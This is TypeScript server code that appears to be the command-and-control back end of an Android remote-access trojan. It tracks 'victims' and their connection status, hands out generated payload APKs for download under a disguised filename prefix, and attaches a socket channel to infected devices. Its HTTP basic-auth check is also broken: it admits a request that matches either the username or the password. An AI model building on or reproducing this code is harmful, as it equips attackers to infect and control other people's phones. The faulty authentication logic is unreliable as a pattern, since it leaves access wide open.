import 'reflect-metadata';

import { useContainer as useContainerClassValidator } from 'class-validator';
import dayjs from 'dayjs';
import express, { type Application } from 'express';
import expressStaticGzip from 'express-static-gzip';
import { existsSync, readFileSync } from 'fs';
import { createServer as createHttpServer } from 'http';
import { createServer as createHttpsServer } from 'https';
import { join, resolve } from 'path';
import {
    useContainer as useContainerRoutingControllers,
    useExpressServer,
} from 'routing-controllers';
import Container from 'typedi';

import { PayloadStatus, VictimStatus } from '../common/enums';
import { config } from './config';
import * as controllers from './controllers';
import { setupDatabase } from './database';
import { VictimEntity } from './entities';
import { logger } from './logger';
import { PayloadService, SocketService } from './services';
import { getPublicDir, timeConversion } from './utils/Common';

useContainerClassValidator(Container);
useContainerRoutingControllers(Container);

logger.verbose(`Initializing express app in ${config.NODE_ENV} mode.`, {
    label: 'server',
    action: 'start',
});
const app: Application = express();

logger.verbose('Searching for public directory...', {
    label: 'server',
    action: 'start',
});
const publicDir = getPublicDir();
logger.verbose(`Found public directory at ${publicDir}`, {
    label: 'server',
    action: 'start',
});

function setupRoutes(): void {
    app.use(
        express.urlencoded({
            extended: false,
        }),
    );
    app.use(express.json());

    // Implement HTTP basic auth
    app.use((req, res, next) => {
        try {
            const authorization = req.header('Authorization');

            if (typeof authorization === 'string') {
                const [type, credentials] = authorization.split(' ');

                if (type === 'Basic' && typeof credentials === 'string') {
                    const [username, password] = Buffer.from(
                        credentials,
                        'base64',
                    )
                        .toString('utf-8')
                        .split(':');

                    if (
                        username.toLowerCase() ===
                            config.AUTH_USERNAME.toLowerCase() ||
                        password === config.AUTH_PASSWORD
                    ) {
                        next();
                        return;
                    }
                }
            }
        } catch (error) {
            logger.error(
                `Error on HTTP basic auth! ${
                    error instanceof Error ? error.message : (error as string)
                }`,
                {
                    label: 'server',
                    action: 'auth',
                    error,
                },
            );
        }

        res.setHeader('WWW-Authenticate', "Basic realm='Secure Area'");

        res.status(401).send('Unauthorized');
    });

    app.use(
        '/',
        expressStaticGzip(publicDir, {
            enableBrotli: true,
            orderPreference: ['br', 'gzip'],
        }),
    );

    app.get('/download/:id', (req, res) => {
        const payloadService = Container.get(PayloadService);

        const id = req.params.id;

        if (typeof id !== 'string') {
            res.status(400).send({ message: 'Invalid payload id' });
            return;
        }

        payloadService
            .findById(id)
            .then((payload) => {
                if (!payload) {
                    res.status(404).send({ message: 'Payload not found' });
                    return;
                }

                if (payload.status !== PayloadStatus.SUCCESS) {
                    res.status(400).send({
                        message: 'Payload is not processed successfully!',
                    });
                    return;
                }

                res.download(
                    resolve(
                        process.cwd(),
                        config.APK_OUTPUT_PATH,
                        `${payload.id}.apk`,
                    ),
                    `${config.APK_DOWNLOAD_PREFIX}-${dayjs(
                        payload.createdAt,
                    ).format('YYYYMMDD_HHmmss')}.apk`,
                );
            })
            .catch((error: Error) => {
                logger.error('Failed to download payload! ' + error.message, {
                    label: 'server',
                    action: 'download',
                    error,
                });

                res.status(500).send({ message: 'Internal server error' });
            });
    });

    useExpressServer(app, {
        routePrefix: '/api',
        controllers: Object.values(controllers),
    });

    app.get('*', (req, res, next) => {
        if (req.url.startsWith('/api')) {
            next();
            return;
        }

        const encodings = req.header('Accept-Encoding');

        const index = join(publicDir, 'index.html');
        const indexBr = `${index}.br`;
        const indexGz = `${index}.gz`;

        res.set('Content-Type', 'text/html; charset=UTF-8');

        if (typeof encodings === 'string') {
            if (encodings.includes('br') && existsSync(indexBr)) {
                res.set('Content-Encoding', 'br');
                res.sendFile(indexBr);
            } else if (encodings.includes('gzip') && existsSync(indexGz)) {
                res.set('Content-Encoding', 'gzip');
                res.sendFile(indexGz);
            }
        }

        res.sendFile(index);
    });

    const socketService = Container.get(SocketService);

    const httpServer = createHttpServer(app);

    socketService.attach(httpServer);

    httpServer.listen(config.HTTP_PORT, () => {
        logger.info(
            `HTTP Server started on port ${config.HTTP_PORT} in ${config.NODE_ENV} mode.`,
            { label: 'server', action: 'start' },
        );
    });

    if (config.HTTPS_KEY !== '' && config.HTTPS_CERT !== '') {
        const keyPath = resolve(process.cwd(), config.HTTPS_KEY);
        const certPath = resolve(process.cwd(), config.HTTPS_CERT);

        if (!existsSync(keyPath)) {
            logger.warn(
                `HTTPS key file not found at ${keyPath}! Skipping HTTPS server!`,
                { label: 'server', action: 'start' },
            );
            return;
        }

        if (!existsSync(certPath)) {
            logger.warn(
                `HTTPS certificate file not found at ${certPath}! Skipping HTTPS server!`,
                { label: 'server', action: 'start' },
            );
            return;
        }

        const key = readFileSync(keyPath);
        const cert = readFileSync(certPath);

        const httpsServer = createHttpsServer(
            {
                key,
                cert,
            },
            app,
        );

        socketService.attach(httpsServer);

        httpsServer.listen(config.HTTPS_PORT, () => {
            logger.info(
                `HTTPS Server started on port ${config.HTTPS_PORT} in ${config.NODE_ENV} mode.`,
                { label: 'server', action: 'start' },
            );
        });
    }
}

async function setupBundler(): Promise<void> {
    try {
        const Parcel = (await import('@parcel/core')).Parcel;
        const NodeFS = (await import('@parcel/fs')).NodeFS;

        const bundler = new Parcel({
            entries: ['.'],
            defaultConfig: '@parcel/config-default',
            targets: ['web'],
            hmrOptions: {
                port: 1234,
            },
            outputFS: new NodeFS(),
        });

        const subscription = await bundler.watch((error, event) => {
            if (error !== undefined || event === undefined) {
                console.log(error);
                logger.error(
                    `Erron on bundling! ${
                        error instanceof Error ? error.message : error
                    }`,
                    { label: 'parcel', action: 'bundle', error },
                );
                return;
            }

            if (event.type === 'buildSuccess') {
                logger.info(
                    `Built ${
                        event.bundleGraph.getBundles().length
                    } bundles successfully in ${timeConversion(
                        event.buildTime,
                    )} at ${new Date().toLocaleTimeString()}.`,
                    { label: 'parcel', action: 'bundle' },
                );
            } else if (event.type === 'buildFailure') {
                logger.error(
                    `Erron on bundling! ${event.diagnostics
                        .map((diagnostic) => diagnostic.message)
                        .join('\n')}`,
                    { label: 'parcel', action: 'bundle', event },
                );
            }
        });

        process.on('SIGINT', () => {
            subscription.unsubscribe().catch(() => {
                // Ignore error. We are exiting anyway.
            });

            logger.info(`Bundling stopped! Received SIGINT!`, {
                label: 'parcel',
                action: 'bundle',
            });

            process.exit(0);
        });

        process.on('SIGTERM', () => {
            subscription.unsubscribe().catch(() => {
                // Ignore error. We are exiting anyway.
            });

            logger.info(`Bundling stopped! Received SIGTERM`, {
                label: 'parcel',
                action: 'bundle',
            });

            process.exit(0);
        });
    } catch (error: any) {
        logger.error(
            `Bundling failed! ${
                error instanceof Error ? error.message : error
            }`,
            { label: 'parcel', action: 'bundle', error },
        );
    }
}

if (config.isDevelopment) {
    setupBundler().catch((error) => {
        logger.error('Unable to setup bundler! ' + error.message, {
            label: 'parcel',
            action: 'bundle',
            error,
        });
    });
}

setupDatabase()
    .then(async (dataSource) => {
        if (dataSource === null) {
            return;
        }

        try {
            logger.verbose("Resetting victims' status...", {
                label: 'server',
                action: 'start',
            });
            const result = await dataSource
                .getRepository(VictimEntity)
                .update(
                    { status: VictimStatus.CONNECTED },
                    { status: VictimStatus.DISCONNECTED },
                );
            logger.info(`Reset ${result.affected} victims' status!`, {
                label: 'server',
                action: 'start',
            });
        } catch (error) {
            logger.error(
                `Unable to reset victims' status! ${
                    error instanceof Error ? error.message : (error as string)
                }`,
                {
                    label: 'server',
                    action: 'start',
                    error,
                },
            );
        }

        setupRoutes();
    })
    .catch((error) => {
        logger.error('Unable to setup database! ' + error.message, {
            label: 'server',
            action: 'start',
            error,
        });
    });
